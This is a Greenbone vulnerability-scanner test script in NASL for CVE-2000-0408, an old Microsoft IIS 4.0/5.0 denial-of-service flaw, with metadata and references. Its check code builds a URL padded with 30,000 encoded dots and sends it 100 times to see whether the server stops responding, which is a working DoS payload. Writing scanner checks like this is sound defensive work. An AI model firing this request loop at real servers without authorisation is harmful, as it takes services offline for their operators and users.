# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:microsoft:internet_information_services";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802439");
  script_version("2024-06-27T05:05:29+0000");
  script_cve_id("CVE-2000-0408");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"creation_date", value:"2012-07-03 16:55:41 +0530 (Tue, 03 Jul 2012)");
  script_tag(name:"last_modification", value:"2024-06-27 05:05:29 +0000 (Thu, 27 Jun 2024)");
  script_name("Microsoft IIS Malformed File Extension DoS Vulnerability");
  script_xref(name:"URL", value:"http://www.ussrback.com/labs40.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/1190");
  script_xref(name:"URL", value:"https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-030");
  script_xref(name:"URL", value:"http://www.iss.net/security_center/reference/vuln/iis-url-extension-data-dos.htm");

  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Windows : Microsoft Bulletins");
  script_dependencies("gb_microsoft_iis_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("IIS/installed");

  script_tag(name:"impact", value:"Successful exploitation could slow the servers response or stop it altogether.");

  script_tag(name:"affected", value:"Microsoft IIS 4.0/5.0.");

  script_tag(name:"insight", value:"The flaw is due to error in IIS, If a malicious user request a file
  from a web server via an URL containing specially malformed file extension
  data, the server will become unresponsive for some period of time.");

  script_tag(name:"solution", value:"The vendor has released updates. Please see the references for more information.");

  script_tag(name:"summary", value:"This host is missing important security update according to
  Microsoft Bulletin MS00-030.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(port:port, cpe:CPE, nofork:TRUE))
  exit(0);

file = "/%69%6E%64%78" + crap(data:"%2E", length:30000) + "%73%74%6D";
req = http_get(item:file, port:port);

for(i=0; i<100; i=i+1) {
  soc = http_open_socket(port);
  if(!soc)
    exit(0);

  send(socket:soc, data:req);
  http_close_socket(soc);
}

sleep(3);

if(http_is_dead(port:port)){
  security_message(port:port);
  exit(0);
}

exit(99);
